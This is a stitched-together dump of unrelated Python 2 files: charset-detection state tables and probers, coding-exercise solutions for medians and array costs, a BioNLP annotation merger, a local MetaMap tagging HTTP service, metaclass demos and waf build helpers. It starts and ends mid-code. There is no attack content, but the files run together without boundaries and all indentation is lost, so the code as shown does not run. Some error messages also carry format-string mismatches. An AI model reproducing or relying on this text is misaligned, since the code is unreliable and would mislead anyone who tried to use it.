if codingState == constants.eError:
if constants._debug:
sys.stderr.write(self.get_charset_name()
+ ' prober hit error at byte ' + str(i)
+ '\n')
self._mState = constants.eNotMe
break
elif codingState == constants.eItsMe:
self._mState = constants.eFoundIt
break
elif codingState == constants.eStart:
charLen = self._mCodingSM.get_current_charlen()
if i == 0:
self._mLastChar[1] = aBuf[0]
self._mDistributionAnalyzer.feed(self._mLastChar, charLen)
else:
self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],
charLen)
self._mLastChar[0] = aBuf[aLen - 1]
if self.get_state() == constants.eDetecting:
if (self._mDistributionAnalyzer.got_enough_data() and
(self.get_confidence() > constants.SHORTCUT_THRESHOLD)):
self._mState = constants.eFoundIt
return self.get_state()
def get_confidence(self):
return self._mDistributionAnalyzer.get_confidence()
from .charsetgroupprober import CharSetGroupProber
from .utf8prober import UTF8Prober
from .sjisprober import SJISProber
from .eucjpprober import EUCJPProber
from .gb2312prober import GB2312Prober
from .euckrprober import EUCKRProber
from .big5prober import Big5Prober
from .euctwprober import EUCTWProber
class MBCSGroupProber(CharSetGroupProber):
def __init__(self):
CharSetGroupProber.__init__(self)
self._mProbers = [
UTF8Prober(),
SJISProber(),
EUCJPProber(),
GB2312Prober(),
EUCKRProber(),
Big5Prober(),
EUCTWProber()
]
self.reset()
from .constants import eStart, eError, eItsMe
BIG5_cls = (
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,0,0,
1,1,1,1,1,1,1,1,
1,1,1,0,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,1,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,0
)
BIG5_st = (
eError,eStart,eStart,     3,eError,eError,eError,eError,
eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,
eError,eStart,eStart,eStart,eStart,eStart,eStart,eStart
)
Big5CharLenTable = (0, 1, 1, 2, 0)
Big5SMModel = {'classTable': BIG5_cls,
'classFactor': 5,
'stateTable': BIG5_st,
'charLenTable': Big5CharLenTable,
'name': 'Big5'}
EUCJP_cls = (
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,5,5,
4,4,4,4,4,4,4,4,
4,4,4,5,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
5,5,5,5,5,5,5,5,
5,5,5,5,5,5,1,3,
5,5,5,5,5,5,5,5,
5,5,5,5,5,5,5,5,
5,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,5
)
EUCJP_st = (
3,     4,     3,     5,eStart,eError,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eStart,eError,eStart,eError,eError,eError,
eError,eError,eStart,eError,eError,eError,     3,eError,
3,eError,eError,eError,eStart,eStart,eStart,eStart
)
EUCJPCharLenTable = (2, 2, 2, 3, 1, 0)
EUCJPSMModel = {'classTable': EUCJP_cls,
'classFactor': 6,
'stateTable': EUCJP_st,
'charLenTable': EUCJPCharLenTable,
'name': 'EUC-JP'}
EUCKR_cls  = (
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,0,0,
1,1,1,1,1,1,1,1,
1,1,1,0,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,2,2,2,2,2,2,2,
2,2,2,2,2,3,3,3,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,3,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,0
)
EUCKR_st = (
eError,eStart,     3,eError,eError,eError,eError,eError,
eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,eStart,eStart
)
EUCKRCharLenTable = (0, 1, 2, 0)
EUCKRSMModel = {'classTable': EUCKR_cls,
'classFactor': 4,
'stateTable': EUCKR_st,
'charLenTable': EUCKRCharLenTable,
'name': 'EUC-KR'}
EUCTW_cls = (
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,0,0,
2,2,2,2,2,2,2,2,
2,2,2,0,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,6,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,3,4,4,4,4,4,4,
5,5,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,3,1,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,0
)
EUCTW_st = (
eError,eError,eStart,     3,     3,     3,     4,eError,
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eStart,eError,
eStart,eStart,eStart,eError,eError,eError,eError,eError,
5,eError,eError,eError,eStart,eError,eStart,eStart,
eStart,eError,eStart,eStart,eStart,eStart,eStart,eStart
)
EUCTWCharLenTable = (0, 0, 1, 2, 2, 2, 3)
EUCTWSMModel = {'classTable': EUCTW_cls,
'classFactor': 7,
'stateTable': EUCTW_st,
'charLenTable': EUCTWCharLenTable,
'name': 'x-euc-tw'}
GB2312_cls = (
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,0,0,
1,1,1,1,1,1,1,1,
1,1,1,0,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
3,3,3,3,3,3,3,3,
3,3,1,1,1,1,1,1,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,4,
5,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,0
)
GB2312_st = (
eError,eStart,eStart,eStart,eStart,eStart,     3,eError,
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,eStart,
4,eError,eStart,eStart,eError,eError,eError,eError,
eError,eError,     5,eError,eError,eError,eItsMe,eError,
eError,eError,eStart,eStart,eStart,eStart,eStart,eStart
)
GB2312CharLenTable = (0, 1, 1, 1, 1, 1, 2)
GB2312SMModel = {'classTable': GB2312_cls,
'classFactor': 7,
'stateTable': GB2312_st,
'charLenTable': GB2312CharLenTable,
'name': 'GB2312'}
SJIS_cls = (
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,0,0,
1,1,1,1,1,1,1,1,
1,1,1,0,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,1,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
3,3,3,3,3,3,3,3,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
2,2,2,2,2,2,2,2,
3,3,3,3,3,3,3,3,
3,3,3,3,3,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,0,0,0
)
SJIS_st = (
eError,eStart,eStart,     3,eError,eError,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eError,eError,eStart,eStart,eStart,eStart
)
SJISCharLenTable = (0, 1, 1, 2, 0, 0)
SJISSMModel = {'classTable': SJIS_cls,
'classFactor': 6,
'stateTable': SJIS_st,
'charLenTable': SJISCharLenTable,
'name': 'Shift_JIS'}
UCS2BE_cls = (
0,0,0,0,0,0,0,0,
0,0,1,0,0,2,0,0,
0,0,0,0,0,0,0,0,
0,0,0,3,0,0,0,0,
0,0,0,0,0,0,0,0,
0,3,3,3,3,3,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,4,5
)
UCS2BE_st  = (
5,     7,     7,eError,     4,     3,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,     6,     6,     6,     6,eError,eError,
6,     6,     6,     6,     6,eItsMe,     6,     6,
6,     6,     6,     6,     5,     7,     7,eError,
5,     8,     6,     6,eError,     6,     6,     6,
6,     6,     6,     6,eError,eError,eStart,eStart
)
UCS2BECharLenTable = (2, 2, 2, 0, 2, 2)
UCS2BESMModel = {'classTable': UCS2BE_cls,
'classFactor': 6,
'stateTable': UCS2BE_st,
'charLenTable': UCS2BECharLenTable,
'name': 'UTF-16BE'}
UCS2LE_cls = (
0,0,0,0,0,0,0,0,
0,0,1,0,0,2,0,0,
0,0,0,0,0,0,0,0,
0,0,0,3,0,0,0,0,
0,0,0,0,0,0,0,0,
0,3,3,3,3,3,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,
0,0,0,0,0,0,4,5
)
UCS2LE_st = (
6,     6,     7,     6,     4,     3,eError,eError,
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,     5,     5,     5,eError,eItsMe,eError,
5,     5,     5,eError,     5,eError,     6,     6,
7,     6,     8,     8,     5,     5,     5,eError,
5,     5,     5,eError,eError,eError,     5,     5,
5,     5,     5,eError,     5,eError,eStart,eStart
)
UCS2LECharLenTable = (2, 2, 2, 2, 2, 2)
UCS2LESMModel = {'classTable': UCS2LE_cls,
'classFactor': 6,
'stateTable': UCS2LE_st,
'charLenTable': UCS2LECharLenTable,
'name': 'UTF-16LE'}
UTF8_cls = (
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,0,0,
1,1,1,1,1,1,1,1,
1,1,1,0,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,
2,2,2,2,3,3,3,3,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
4,4,4,4,4,4,4,4,
5,5,5,5,5,5,5,5,
5,5,5,5,5,5,5,5,
5,5,5,5,5,5,5,5,
5,5,5,5,5,5,5,5,
0,0,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
6,6,6,6,6,6,6,6,
7,8,8,8,8,8,8,8,
8,8,8,8,8,9,8,8,
10,11,11,11,11,11,11,11,
12,13,13,13,14,15,0,0
)
UTF8_st = (
eError,eStart,eError,eError,eError,eError,     12,   10,
9,     11,     8,     7,     6,     5,     4,    3,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,
eError,eError,     5,     5,     5,     5,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eError,     5,     5,     5,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,     7,     7,     7,     7,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eError,     7,     7,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,     9,     9,     9,     9,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eError,eError,     9,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,    12,    12,    12,    12,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eError,eError,eError,    12,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,    12,    12,    12,eError,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError,
eError,eError,eStart,eStart,eStart,eStart,eError,eError,
eError,eError,eError,eError,eError,eError,eError,eError
)
UTF8CharLenTable = (0, 1, 0, 0, 0, 0, 2, 3, 3, 3, 4, 4, 5, 5, 6, 6)
UTF8SMModel = {'classTable': UTF8_cls,
'classFactor': 16,
'stateTable': UTF8_st,
'charLenTable': UTF8CharLenTable,
'name': 'UTF-8'}
import heapq
class DualHeap(object):
def __init__(self):
self.min_h = []
self.max_h = []
def insert(self, num):
if not self.min_h or num > self.min_h[0]:
heapq.heappush(self.min_h, num)
else:
heapq.heappush(self.max_h, -num)
self.balance()
def balance(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
if l1-l2 > 1:
heapq.heappush(self.max_h, -heapq.heappop(self.min_h))
self.balance()
elif l2-l1 > 1:
heapq.heappush(self.min_h, -heapq.heappop(self.max_h))
self.balance()
return
def get_median(self):
l1 = len(self.min_h)
l2 = len(self.max_h)
m = (l1+l2-1)/2
if m == l2-1:
return -self.max_h[0]
elif m == l2:
return self.min_h[0]
raise Exception("not balanced")
class Solution:
def medianII(self, nums):
dh = DualHeap()
ret = []
for num in nums:
dh.insert(num)
ret.append(dh.get_median())
return ret
if __name__=="__main__":
assert Solution().medianII([4, 5, 1, 3, 2, 6, 0]) == [4, 4, 4, 3, 3, 3, 3]
class Solution:
def median(self, nums):
n = len(nums)
return self.find_kth(nums, 0, n, (n-1)/2)
def find_kth(self, A, i, j, k):
p = self.pivot(A, i, j)
if k == p:
return A[p]
elif k > p:
return self.find_kth(A, p+1, j, k)
else:
return self.find_kth(A, i, p, k)
def pivot(self, A, i, j):
p = i
closed = p
for ptr in xrange(i, j):
if A[ptr] < A[p]:
closed += 1
A[ptr], A[closed] = A[closed], A[ptr]
A[closed], A[p] = A[p], A[closed]
return closed
if __name__ == "__main__":
assert Solution().median([4, 5, 1, 2, 3]) == 3
assert Solution().median([7, 9, 4, 5]) == 5
from __future__ import with_statement
from collections import defaultdict
from os.path import join as join_path
from os.path import split as split_path
from shlex import split as shlex_split
from sys import stderr, stdin
from subprocess import Popen, PIPE
try:
from argparse import ArgumentParser
except ImportError:
from os.path import basename
from sys import path as sys_path
sys_path.append(join_path(basename(__file__), '../server/lib'))
from argparse import ArgumentParser
UNMERGED_SUFFIXES=['a1', 'a2', 'co', 'rel']
MERGED_SUFFIX='ann'
ARGPARSER = ArgumentParser(description=("Merge BioNLP'11 ST annotations "
'into a single file, reads paths from stdin'))
ARGPARSER.add_argument('-w', '--no-warn', action='store_true',
help='suppress warnings')
def keynat(string):
it = type(1)
r = []
for c in string:
if c.isdigit():
d = int(c)
if r and type( r[-1] ) == it:
r[-1] = r[-1] * 10 + d
else:
r.append(d)
else:
r.append(c.lower())
return r
def main(args):
argp = ARGPARSER.parse_args(args[1:])
id_to_ann_files = defaultdict(list)
for file_path in (l.strip() for l in stdin):
if not any((file_path.endswith(suff) for suff in UNMERGED_SUFFIXES)):
if not argp.no_warn:
import sys
print >> sys.stderr, (
'WARNING: invalid file suffix for %s, ignoring'
) % (file_path, )
continue
dirname, basename = split_path(file_path)
id = join_path(dirname, basename.split('.')[0])
id_to_ann_files[id].append(file_path)
for id, ann_files in id_to_ann_files.iteritems():
lines = []
for ann_file_path in ann_files:
with open(ann_file_path, 'r') as ann_file:
for line in ann_file:
lines.append(line)
with open(id + '.' + MERGED_SUFFIX, 'w') as merged_ann_file:
for line in lines:
merged_ann_file.write(line)
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import six
class Meta(type):
def __new__(mcs, name, bases, class_dict):
print (mcs, name, bases, class_dict)
return type.__new__(mcs, name, bases, class_dict)
class MyClass(object):
__metaclass__ = Meta
foo = 1
def __init__(self):
self.bar = 2
def foo_method(self):
pass
registry = {}
def register_class(target_class):
registry[target_class.__name__] = target_class
class RegistryMeta(type):
def __new__(mcs, name, bases, class_dict):
cls = type.__new__(mcs, name, bases, class_dict)
register_class(cls)
return cls
class RegisteredClass(six.with_metaclass(RegistryMeta)):
pass
from argparse import ArgumentParser
from os.path import join as path_join
from os.path import dirname
try:
from json import dumps
except ImportError:
from sys import path as sys_path
sys_path.append(path_join(dirname(__file__), '../server/lib/ujson'))
from ujson import dumps
from subprocess import PIPE, Popen
from random import choice, randint
from sys import stderr
from urlparse import urlparse
try:
from urlparse import parse_qs
except ImportError:
from cgi import parse_qs
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import re
from sentencesplit import sentencebreaks_to_newlines
from MetaMaptoStandoff import MetaMap_lines_to_standoff
METAMAP_SCRIPT   = path_join(dirname(__file__), './metamap_tag.sh')
METAMAP_COMMAND  = [METAMAP_SCRIPT]
ARGPARSER = ArgumentParser(description='An example HTTP tagging service using MetaMap')
ARGPARSER.add_argument('-p', '--port', type=int, default=47111,
help='port to run the HTTP service on (default: 47111)')
def run_tagger(cmd):
try:
tagger_process = Popen(cmd, stdin=PIPE, stdout=PIPE, bufsize=1)
return tagger_process
except Exception, e:
print >> stderr, "Error running '%s':" % cmd, e
raise
def _apply_tagger_to_sentence(text):
tagger_process = run_tagger(METAMAP_COMMAND)
print >> tagger_process.stdin, text
tagger_process.stdin.close()
tagger_process.wait()
response_lines = []
for l in tagger_process.stdout:
l = l.rstrip('\n')
response_lines.append(l)
try:
tagged_entities = MetaMap_lines_to_standoff(response_lines, text)
except:
print >> stderr, "Warning: MetaMap-to-standoff conversion failed for output:\n'%s'" % '\n'.join(response_lines)
raise
for t in tagged_entities:
t.eText = text[t.startOff:t.endOff]
return tagged_entities
def _apply_tagger(text):
try:
splittext = sentencebreaks_to_newlines(text)
except:
print >> stderr, "Warning: sentence splitting failed for input:\n'%s'" % text
splittext = text
sentences = splittext.split('\n')
all_tagged = []
baseoffset = 0
for s in sentences:
tagged = _apply_tagger_to_sentence(s)
for t in tagged:
t.startOff += baseoffset
t.endOff += baseoffset
all_tagged.extend(tagged)
baseoffset += len(s)+1
anns = {}
idseq = 1
for t in all_tagged:
anns["T%d" % idseq] = {
'type': t.eType,
'offsets': ((t.startOff, t.endOff), ),
'texts': (t.eText, ),
}
idseq += 1
return anns
class MetaMapTaggerHandler(BaseHTTPRequestHandler):
def do_POST(self):
query = parse_qs(urlparse(self.path).query)
try:
json_dic = _apply_tagger(query['text'][0])
except KeyError:
json_dic = {}
self.send_response(200)
self.send_header('Content-type', 'application/json; charset=utf-8')
self.end_headers()
self.wfile.write(dumps(json_dic))
print >> stderr, ('Generated %d annotations' % len(json_dic))
def log_message(self, format, *args):
return
def main(args):
argp = ARGPARSER.parse_args(args[1:])
print >> stderr, 'Starting MetaMap ...'
server_class = HTTPServer
httpd = server_class(('localhost', argp.port), MetaMapTaggerHandler)
print >> stderr, 'MetaMap tagger service started'
try:
httpd.serve_forever()
except KeyboardInterrupt:
pass
httpd.server_close()
print >> stderr, 'MetaMap tagger service stopped'
if __name__ == '__main__':
from sys import argv
exit(main(argv))
import sys
import re
import os
import codecs
FIELDED_OUTPUT_RE = re.compile(r'^\d+\|')
class taggedEntity:
def __init__(self, startOff, endOff, eType, idNum):
self.startOff = startOff
self.endOff   = endOff
self.eType    = eType
self.idNum    = idNum
def __str__(self):
return "T%d\t%s %d %d" % (self.idNum, self.eType, self.startOff, self.endOff)
def MetaMap_lines_to_standoff(metamap_lines, reftext=None):
tagged = []
idseq = 1
for l in metamap_lines:
l = l.rstrip('\n')
if not FIELDED_OUTPUT_RE.match(l):
continue
fields = l.split('|')
if len(fields) < 9:
print >> sys.stderr, "Note: skipping unparseable MetaMap output line: %s" % l
continue
ctext, CUI, semtype, offset = fields[3], fields[4], fields[5], fields[8]
semtype = semtype.replace('[','').replace(']','')
m = re.match(r'^(?:\d+:\d+,)*(\d+):(\d+)$', offset)
start, length = m.groups()
start, length = int(start), int(length)
tagged.append(taggedEntity(start, start+length, semtype, idseq))
idseq += 1
print >> sys.stderr, "MetaMaptoStandoff: returning %s tagged spans" % len(tagged)
return tagged
if __name__ == "__main__":
lines = [l for l in sys.stdin]
standoff = MetaMap_lines_to_standoff(lines)
for s in standoff:
print s
import micromodels
import json
import datetime
class ExampleModel(micromodels.Model):
myfield = micromodels.CharField()
time = micromodels.DateTimeField()
e = ExampleModel.from_dict(json.dumps({'myfield': 'Some Value', 'time': '2012-05-29T19:30:03.000283+00:00'}), is_json=True)
print e.to_json()
e.myfield = "a"
e.time = datetime.datetime.now()
print e.to_json()
print e.to_dict()
class Solution:
def MinAdjustmentCost(self, A, target):
S = 100
n = len(A)
f = [[1<<31 for _ in xrange(S+1)] for _ in xrange(n+1)]
for j in xrange(S+1):
f[0][j] = 0
for i in xrange(1, n+1):
for j in xrange(1, S+1):
for k in xrange(max(1, j-target), min(S, j+target)+1):
f[i][j] = min(f[i][j], f[i-1][k]+abs(A[i-1]-j))
mini = 1<<31
for j in xrange(1, S+1):
mini = min(mini, f[n][j])
return mini
if __name__ == "__main__":
assert Solution().MinAdjustmentCost([12, 3, 7, 4, 5, 13, 2, 8, 4, 7, 6, 5, 7], 2) == 19
class Solution:
def minSubArray(self, nums):
mini = min(nums)
current = 0
for a in nums:
current += a
mini = min(mini, current)
if current > 0:
current = 0
return mini
if __name__ == "__main__":
assert Solution().minSubArray([1, -1, -2, 1]) == -3
import shutil, re, os
from waflib import TaskGen, Node, Task, Utils, Build, Errors
from waflib.TaskGen import feature, after_method, before_method
from waflib.Logs import debug
def copy_attrs(orig, dest, names, only_if_set=False):
for a in Utils.to_list(names):
u = getattr(orig, a, ())
if u or not only_if_set:
setattr(dest, a, u)
def copy_func(tsk):
"Make a file copy. This might be used to make other kinds of file processing (even calling a compiler is possible)"
env = tsk.env
infile = tsk.inputs[0].abspath()
outfile = tsk.outputs[0].abspath()
try:
shutil.copy2(infile, outfile)
except (OSError, IOError):
return 1
else:
if tsk.chmod: os.chmod(outfile, tsk.chmod)
return 0
def action_process_file_func(tsk):
"Ask the function attached to the task to process it"
if not tsk.fun: raise Errors.WafError('task must have a function attached to it for copy_func to work!')
return tsk.fun(tsk)
@feature('cmd')
def apply_cmd(self):
"call a command everytime"
if not self.fun: raise Errors.WafError('cmdobj needs a function!')
tsk = Task.TaskBase()
tsk.fun = self.fun
tsk.env = self.env
self.tasks.append(tsk)
tsk.install_path = self.install_path
@feature('copy')
@before_method('process_source')
def apply_copy(self):
Utils.def_attrs(self, fun=copy_func)
self.default_install_path = 0
lst = self.to_list(self.source)
self.meths.remove('process_source')
for filename in lst:
node = self.path.find_resource(filename)
if not node: raise Errors.WafError('cannot find input file %s for processing' % filename)
target = self.target
if not target or len(lst)>1: target = node.name
newnode = self.path.find_or_declare(target)
tsk = self.create_task('copy', node, newnode)
tsk.fun = self.fun
tsk.chmod = getattr(self, 'chmod', Utils.O644)
if not tsk.env:
tsk.debug()
raise Errors.WafError('task without an environment')
def subst_func(tsk):
"Substitutes variables in a .in file"
m4_re = re.compile('@(\w+)@', re.M)
code = tsk.inputs[0].read()
code = code.replace('%', '%%')
s = m4_re.sub(r'%(\1)s', code)
env = tsk.env
di = getattr(tsk, 'dict', {}) or getattr(tsk.generator, 'dict', {})
if not di:
names = m4_re.findall(code)
for i in names:
di[i] = env.get_flat(i) or env.get_flat(i.upper())
tsk.outputs[0].write(s % di)
@feature('subst')
@before_method('process_source')
def apply_subst(self):
Utils.def_attrs(self, fun=subst_func)
lst = self.to_list(self.source)
self.meths.remove('process_source')
self.dict = getattr(self, 'dict', {})
for filename in lst:
node = self.path.find_resource(filename)
if not node: raise Errors.WafError('cannot find input file %s for processing' % filename)
if self.target:
newnode = self.path.find_or_declare(self.target)
else:
newnode = node.change_ext('')
try:
self.dict = self.dict.get_merged_dict()
except AttributeError:
pass
if self.dict and not self.env['DICT_HASH']:
self.env = self.env.derive()
keys = list(self.dict.keys())
keys.sort()
lst = [self.dict[x] for x in keys]
self.env['DICT_HASH'] = str(Utils.h_list(lst))
tsk = self.create_task('copy', node, newnode)
tsk.fun = self.fun
tsk.dict = self.dict
tsk.dep_vars = ['DICT_HASH']
tsk.chmod = getattr(self, 'chmod', Utils.O644)
if not tsk.env:
tsk.debug()
raise Errors.WafError('task without an environment')
class cmd_arg(object):
def __init__(self, name, template='%s'):
self.name = name
self.template = template
self.node = None
class input_file(cmd_arg):
def find_node(self, base_path):
assert isinstance(base_path, Node.Node)
self.node = base_path.find_resource(self.name)
if self.node is None:
raise Errors.WafError("Input file %s not found in " % (self.name, base_path))
def get_path(self, env, absolute):
if absolute:
return self.template % self.node.abspath()
else:
return self.template % self.node.srcpath()
class output_file(cmd_arg):
def find_node(self, base_path):
assert isinstance(base_path, Node.Node)
self.node = base_path.find_or_declare(self.name)
if self.node is None:
raise Errors.WafError("Output file %s not found in " % (self.name, base_path))
def get_path(self, env, absolute):
if absolute:
return self.template % self.node.abspath()
else:
return self.template % self.node.bldpath()
class cmd_dir_arg(cmd_arg):
def find_node(self, base_path):
